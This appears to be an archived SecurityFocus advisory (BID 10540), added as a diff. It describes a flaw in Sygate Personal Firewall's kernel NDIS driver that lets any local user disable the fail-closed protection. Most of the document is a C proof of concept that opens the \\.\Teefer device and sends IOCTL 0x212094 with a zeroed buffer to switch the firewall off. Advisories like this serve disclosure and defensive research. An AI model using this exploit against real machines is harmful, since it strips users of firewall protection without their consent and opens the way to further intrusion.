@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/10540/info
+
+A vulnerability is reported to affect the Sygate Personal Firewall fail-closed functionality. It is reported that the kernel-space NDIS driver does not verify the origin of messages that are received through the associated device. As a result of this it is possible for a local user to transmit a message to the kernel-space NDIS driver device in order to disable the firewall fail-closed functionality.
+
+A local attacker may exploit this condition to disable the affected firewall completely.
+
+
+	hDevice = CreateFile("\\\\.\\Teefer", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+			 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+ 	if(hDevice == INVALID_HANDLE_VALUE)
+	{
+		printf("Open failed\n");
+	}
+	else
+	{
+		printf("Device opened.\n");
+										
+		char buffer[8];
+		DWORD *ptr = (DWORD *)buffer;
+		DWORD *ptr2 = (DWORD *)(buffer + 4);
+		DWORD ret;
+
+		*ptr = 0;
+		*ptr2 = 0;
+			
+		if(DeviceIoControl(hDevice, 0x212094, buffer, 8, buffer, 8, &ret, 0))
+			printf("Sent.\n");
+												
+		CloseHandle(hDevice);
+	}
+ 
+ 
+
